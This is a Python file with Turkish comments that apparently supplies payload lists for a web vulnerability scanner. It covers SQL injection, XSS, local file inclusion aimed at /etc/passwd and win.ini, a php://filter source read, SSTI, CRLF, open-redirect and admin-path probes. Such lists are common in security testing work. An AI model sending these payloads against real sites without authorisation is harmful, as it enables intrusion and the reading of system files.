from urllib.parse import quote

# SQLi payloadları
BOOLEAN_PAIRS = [
    ("1' OR '1'='1", "1' OR '1'='2"),
    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
    ("' OR ''='", "' AND ''!='"),
]

SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "warning: mysqli",
    "mysql_fetch",
    "mysql_num_rows",
    "mysqli_query()",
    "pdoexception",
    "sqlstate",
    "unclosed quotation mark",
    "quoted string not properly terminated",
]

TIME_PAYLOADS = [
    "1' OR SLEEP(3)--",
    "1\" OR SLEEP(3)--",
    "1') OR SLEEP(3)--",
]

# XSS payloadları
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "\" onmouseover=alert(1) x=\"",
    "' onerror=alert(1) '",
    "');alert(1);//",
    "\");alert(1);//",
    quote("<script>alert(1)</script>"),
    quote("<svg/onload=alert(1)>"),
]

DOM_XSS_PATTERNS = [
    r"document\.write",
    r"innerHTML\s*=",
    r"location\.hash",
    r"location\.search",
    r"document\.URL",
]

# LFI payloadları
LFI_PAYLOADS = [
    "../../etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "C:\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]

# Redirect payloadları
REDIRECT_PAYLOADS = [
    "https://example.com",
    "//example.com",
    "/\\example.com",
]

# SSTI payloadları
SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<% 7*7 %>",
    "{{config.items()}}",
]

# CRLF payloadları
CRLF_PAYLOADS = [
    "%0d%0aX-Evil:1",
    "%0d%0aSet-Cookie:crlf=1",
]

# Directory brute paths (çok minimal, sen sonra wordlist ile büyütebilirsin)
COMMON_PATHS = [
    "/admin",
    "/admin.php",
    "/login",
    "/phpinfo.php",
    "/.git/",
    "/backup",
    "/old",
]
